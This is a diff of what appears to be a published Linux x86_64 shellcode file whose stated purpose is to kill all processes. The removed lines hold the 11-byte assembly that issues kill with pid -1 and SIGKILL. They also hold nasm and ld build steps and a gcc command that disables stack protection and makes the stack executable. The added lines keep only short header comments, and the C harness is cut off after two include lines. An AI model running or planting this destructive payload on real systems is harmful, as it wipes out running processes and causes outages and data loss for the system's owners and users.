@@ -1,49 +1,8 @@
-/*
-;Title: Linux/x86_64 - 
-;Author: Aron Mihaljevic
-;Architecture: Linux x86_64
-;Shellcode Length:  11 bytes
-;Description ; this shellcode will kill all processes
-========DESCTIPTION===========================
-      #include <sys/types.h>
-      #include <signal.h>
-        int kill(pid_t pid, int sig); 
 
+//;Architecture: Linux x86_64
+//;Shellcode Length:  11 bytes
+// ; this shellcode will kill all processes
 
-===COMPILATION AND EXECUTION==================
-
-#nasm -f elf64 kill.nasm -o kill.o
-
-#ld kill.o -o kill
-
-=================SHELLCODE================
-
-global _start
-
-section .text
-
-_start:
-
-    
-
-	    
-
-	push 	0x3e		; sys kill
-	pop  	rax
-	push 	-1 			; pid
-	pop		rdi
-	push	0x9			; sig kill
-	pop 	rsi
-	syscall
-
-
-
-====================FOR C Compile===========================
-
-
-# gcc -fno-stack-protector -z execstack kill_all.c -o kill_all
-
-*/
 
 #include<stdio.h>
 #include<string.h>
